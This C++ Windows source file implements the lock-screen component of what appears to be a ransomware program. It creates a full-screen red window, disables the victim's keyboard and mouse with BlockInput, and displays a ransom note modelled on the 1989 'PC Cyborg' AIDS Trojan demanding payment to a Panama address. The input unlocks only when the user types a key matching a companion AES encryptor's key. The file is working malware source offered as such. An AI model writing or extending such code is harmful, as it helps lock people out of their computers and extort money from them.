#include <windows.h>
#include <iostream>
#include <windows.h>
#include <string>
#include "ScreenBlocker.h"
#include "../service/AESEncryptor.h"

using namespace std;

LRESULT CALLBACK
WndProc(HWND
hwnd,
UINT msg, WPARAM
wParam,
LPARAM lParam
) {
switch(msg) {
case WM_CREATE:
{
// Set window background color to red
HBRUSH hbr = CreateSolidBrush(RGB(255, 0, 0));
SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND,
reinterpret_cast
<LONG_PTR>(hbr)
);

// Create a text field
HWND hEdit = CreateWindowEx(WS_EX_CLIENTEDGE, "EDIT", "",
                            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_LEFT,
                            GetSystemMetrics(SM_CXSCREEN) - 320,
                            GetSystemMetrics(SM_CYSCREEN) - 40,
                            300, 20, hwnd, (HMENU) 1, GetModuleHandle(NULL), NULL);

// Create a label
HWND hLabel = CreateWindowEx(0, "STATIC",
                             "Dear Customer:\n"
                             "It is time to pay for your software lease from PC Cyborg Corporation.\n"
                             "Complete the INUOICE and attach payment for the lease option of your choice.\n"
                             "If you don't use the printed INUOICE, then be sure to refer to the important "
                             "reference numbers below in all correspondence. In return you will receive:\n"
                             "- a renewal software package with easy-to-follow, complete instructions:\n"
                             "-  an automatic, self-installing diskette that anyone can apply in minutes.\n"
                             "Important reference numbers: A5599796-2695527-\n"
                             "The price of 365 user applications is US$189. The price of a lease for the lifetime "
                             "of your hard disk is US$378. You must enclose a bankers draft, cashier's check or "
                             "international money order payable to PC CYBORG CORPORATION for the full amount of $189 "
                             "or $378 with your order. Include your name, company, address, city, state, country, zip "
                             "or postal code. Mail your order to PC Cyborg Corporation, P.O. Box 87-17-44, Panama 7, Panama\n\n"
                             "Please ENTER the code to decipher your file!",
                             WS_CHILD | WS_VISIBLE | SS_CENTER,
                             (GetSystemMetrics(SM_CXSCREEN) - 800) / 2,
                             (GetSystemMetrics(SM_CYSCREEN) - 200) / 2,
                             800, 200, hwnd, (HMENU) 2, GetModuleHandle(NULL), NULL);

// Set font of the label
SendMessage(hLabel, WM_SETFONT, (WPARAM)
GetStockObject(DEFAULT_GUI_FONT),
0);
// set color of the label to white
SetTextColor(GetDC(hLabel), RGB(255, 255, 255)
);

break;
}
case WM_COMMAND:
switch(
LOWORD(wParam)
)
{
case 1: // Text field
{
char key[256];
GetWindowText(GetDlgItem(hwnd, 1), key,
sizeof(key));

if (
strcmp(key,
AESEncryptor::KEY.c_str()) == 0) {
// Unblock the screen, close the window and exit the function
BlockInput(false);
DestroyWindow(hwnd);
PostQuitMessage(0);
}
}
break;
}
break;
case WM_DESTROY:
PostQuitMessage(0);
break;
default:
return
DefWindowProc(hwnd, msg, wParam, lParam
);
}
return 0;
}


ScreenBlocker::ScreenBlocker() {}

void ScreenBlocker::blockScreen() {
    WNDCLASSEX wc;
    HWND hwnd;
    MSG Msg;

    // Registering the Window Class
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = GetModuleHandle(NULL);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = "BlockScreen";
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

    if (!RegisterClassEx(&wc)) {
        MessageBox(NULL, "Window Registration Failed!", "Error!",
                   MB_ICONEXCLAMATION | MB_OK);
        return;
    }

    // Create the window
    hwnd = CreateWindowEx(0,
                          "BlockScreen",
                          "BlockScreen",
                          WS_POPUP | WS_VISIBLE,
                          0, 0,
                          GetSystemMetrics(SM_CXSCREEN),
                          GetSystemMetrics(SM_CYSCREEN),
                          NULL, NULL, GetModuleHandle(NULL), NULL);

    // Show the window
    ShowWindow(hwnd, SW_SHOW);
    BlockInput(true);

    // Message loop
    while (GetMessage(&Msg, NULL, 0, 0) > 0) {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
}

ScreenBlocker::~ScreenBlocker() {}
